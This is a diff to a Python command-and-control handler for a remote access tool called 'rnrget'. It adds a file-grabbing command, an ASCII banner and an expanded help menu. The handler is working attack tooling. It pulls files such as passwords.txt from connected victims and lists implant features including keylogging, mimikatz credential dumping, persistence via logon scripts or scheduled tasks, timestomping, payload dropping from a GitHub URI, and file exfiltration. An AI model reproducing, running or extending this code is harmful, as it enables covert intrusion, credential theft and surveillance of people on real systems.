@@ -6,9 +6,12 @@ import datetime
 
 def main():
 	server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	server_socket.bind(("10.0.0.1", 9999))
+	#server_socket.bind(("10.0.0.1", 9999))
+	server_socket.bind(("10.0.0.1",9999))
 	server_socket.listen(5)
-	print("listening for rnrclients on port 9999....")
+	art()
+	menu()
+	print("\nlistening for rnrclients on port 9999....")
 
 	while 1:
 		client_socket, address = server_socket.accept()
@@ -17,7 +20,7 @@ def main():
 			cmd = input("$rnrget> ")
 			args = cmd.split()
 			if(cmd == 'quit' or cmd == 'q'):
-				client_socket.send(cmd.encode())
+				client_socket.send("exit".encode())
 				client_socket.close()
 				break;
 			elif(cmd == 'clear' or cmd == 'cls'):
@@ -37,6 +40,18 @@ def main():
 				f = open(filename,'wb')
 				f.write(data)
 				f.close()
+				print("Operation Complete: screencap has been saved in handler directory as " + filename)
+			elif(args[0] == "getfile"):
+				client_socket.send(cmd.encode())
+				data = b''
+				while True:
+					p = client_socket.recv(4096)
+					data += p
+					if len(p) < 4096:
+						break
+				f = open(args[2],'wb')
+				f.write(data)
+				f.close()
 			else:
 				client_socket.send(cmd.encode())
 				data = b''
@@ -49,31 +64,50 @@ def main():
 def menu():
         print("Command      Description                 Format");
         print("-------      -----------                 ------");
-        print("help         display help menu           rnrget.exe help, rnrget.exe /?, rnrget.exe ?");
-        print("arch         create zip file from dir    rnrget.exe arch <source path> <destination path>, rnrget.exe arch C:\\Users\\srcdir C:\\Users\\dest.zip");
-        print("cp           copy files                  rnrget.exe cp <source path> <destination path>, rnrget.exe cp C:\\Users\\Admin\\sourcefile.txt C:\\Users\\destinationfile.txt");
-        print("del          delete files                rnrget.exe del <target path>, rnrget.exe del C:\\Users\\Admin\\targetfile.txt");
-        print("dld          download payloads           rnrget.exe dld <download path> <URI>, rnrget.exe dld C:\\Users\\Admin\\AppData\\Local\\Temp\\file.dld https://raw.githubusercontent.com/rnranalysis/file.dld");
-        print("enumdir      enumerate files             rnrget.exe enumdir <target dir>, rnrget.exe enumdir C:\\Users\\Admin\\Desktop");
-        print("grep         case sensisitive grep       rnrget.exe grep <pattern> <path>, rnrget.exe grep foo bar.txt");
-        print("hostinfo     get host information        rnrget.exe hostinfo");
-        print("keylog       log key strokes             rnrget.exe keylog");
-        print("mimi         invoke-mimikatz             rnrget.exe mimi");
-        print("mv           move files                  rnrget.exe mv <source> <destination>, rnrget.exe mv C:\\Users\\Admin\\source.file C:\\Users\\Admin\\Desktop\\dest.file");
-        print("mkdir        create directory            rnrget.exe mkdir <target dir>, rnrget.exe mkdir C:\\Users\\Admin\\NewDir");
-        print("persist      pick yo persistence         rnrget.exe persist logonscript or startup or schtask");
-        print("ps           get process listing         rnrget.exe ps");
-        print("pwd          print working directory     rnrget.exe pwd");
-        print("cat          read text from file         rnrget.exe cat <target path>, rnrget.exe cat C:\\Users\\Admin\\helloworld.txt");
-        print("run          run processes               rnrget.exe run <target path>, rnrget.exe run calc.exe");
-        print("runadmin     run processes as admin      rnrget.exe runadmin <target path>, runadmin calc.exe");
-        print("screencap    take screenshot             rnrget.exe screencap <save path>, rnrget.exe screencap C:\\Users\\REM\\Desktop\\screencap.bmp");
-        print("shares       enumerate shares            rnrget.exe shares");
-        print("ts           timestomp                   rnrget.exe ts <target path>, rnrget.exe ts C:\\Users\\Admin\\AppData\\Local\\Temp\\targetfile.bin");
-        print("userinfo     get user information        rnrget.exe userinfo");
-        print("xfil         exfil files                 rnrget.exe xfil <target path> <URI>, rnrget.exe xfil C:\\Users\\Admin\\xfil.me, https://raw.githubusercontent.com/rnranalysis/xfiol.file")
+        print("help         display help menu           help, /?, ?");
+        print("arch         create zip file from dir    arch <source path> <destination path>, arch C:\\Users\\srcdir C:\\Users\\dest.zip");
+        print("cp           copy files                  cp <source path> <destination path>, cp C:\\Users\\Admin\\sourcefile.txt C:\\Users\\destinationfile.txt");
+        print("del          delete files                del <target path>, del C:\\Users\\Admin\\targetfile.txt");
+        print("deldir       delete directory            deldir <target path>, deldir C:\\Users\\Admin\\Directory");
+        print("drop         drop payloads               drop <path> <URI>, dld C:\\Users\\Admin\\AppData\\Local\\Temp\\file.dld https://raw.githubusercontent.com/rnranalysis/file.dld");
+        print("envar        get environmental vars      envar");
+        print("enumdir      enumerate files             enumdir <target dir>, enumdir C:\\Users\\Admin\\Desktop");
+        print("getfile      grab files                  getfile <target path> <local download path>, getfile C:\\Users\\Admin\\passwords.txt /usr/root/Desktop/passwords.txt");
+        print("grep         case sensisitive grep       grep <pattern> <path>, grep foo bar.txt");
+        print("hostinfo     get host information        hostinfo");
+        print("keylog       log key strokes             keylog");
+        print("mimi         invoke-mimikatz             mimi");
+        print("mv           move files                  mv <source> <destination>, mv C:\\Users\\Admin\\source.file C:\\Users\\Admin\\Desktop\\dest.file");
+        print("mkdir        create directory            mkdir <target dir>, mkdir C:\\Users\\Admin\\NewDir");
+        print("persist      pick yo persistence         persist logonscript or startup or schtask");
+        print("ps           get process listing         ps");
+        print("pwd          print working directory     pwd");
+        print("cat          read text from file         cat <target path>, cat C:\\Users\\Admin\\helloworld.txt");
+        print("run          run processes               run <target path>, run calc.exe");
+        print("runadmin     run processes as admin      runadmin <target path>, runadmin calc.exe");
+        print("screencap    take screenshot             screencap <save path>, screencap C:\\Users\\REM\\Desktop\\screencap.bmp");
+        print("shares       enumerate shares            shares");
+        print("ts           timestomp                   ts <target path>, ts C:\\Users\\Admin\\AppData\\Local\\Temp\\targetfile.bin");
+        print("userinfo     get user information        userinfo");
+        print("xfil         exfil files                 xfil <target path> <URI>, xfil C:\\Users\\Admin\\xfil.me, https://raw.githubusercontent.com/rnranalysis/xfiol.file")
+
+
+def art():
+    print("                                                     __     ");
+    print("                                                    /  |    ");
+    print("  ______   _______    ______    ______    ______   _$$ |_   ");
+    print(" /      \\ /       \\  /      \\  /      \\  /      \\ / $$   | ");
+    print("/$$$$$$  |$$$$$$$  |/$$$$$$  |/$$$$$$  |/$$$$$$  |$$$$$$/   ");
+    print("$$ |  $$/ $$ |  $$ |$$ |  $$/ $$ |  $$ |$$    $$ |  $$ | __ ");
+    print("$$ |      $$ |  $$ |$$ |      $$ \\__$$ |$$$$$$$$/   $$ |/  |");
+    print("$$ |      $$ |  $$ |$$ |      $$    $$ |$$       |  $$  $$/ ");
+    print("$$/       $$/   $$/ $$/        $$$$$$$ | $$$$$$$/    $$$$/  ");
+    print("                              /  \\__$$ |                    ");
+    print("                              $$    $$/                     ");
+    print("                               $$$$$$/                      ");
 
 main()
+
 
 
 
